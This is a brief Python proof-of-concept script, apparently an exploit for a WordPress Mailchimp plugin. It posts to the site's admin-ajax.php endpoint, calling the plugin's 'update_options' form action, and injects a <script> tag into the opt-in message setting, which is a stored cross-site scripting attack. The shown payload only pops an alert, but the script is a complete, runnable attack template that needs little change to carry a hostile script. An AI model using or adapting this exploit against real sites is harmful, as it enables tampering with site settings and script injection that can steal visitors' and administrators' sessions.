import requests

html_payload = "<script>alert('.');</script>"
url = 'http://www.example.com/wp-admin/admin-ajax.php'
payload = {
	"action":"yks_mailchimp_form",
	"form_action":"update_options",
	"form_data":"yks-mailchimp-api-key=&yks-mailchimp-flavor=1&yks-mailchimp-optin=true&double-optin-message=%s&single-optin-message=&interest-group-label=Select+Your+Area+of+Interest&yks-mailchimp-optIn-checkbox=1&yks-mailchimp-optin-checkbox-text=SIGN+ME+UP!&yks-mailchimp-optIn-default-list=select_list"%html_payload
}

r = requests.post(url, data=payload)
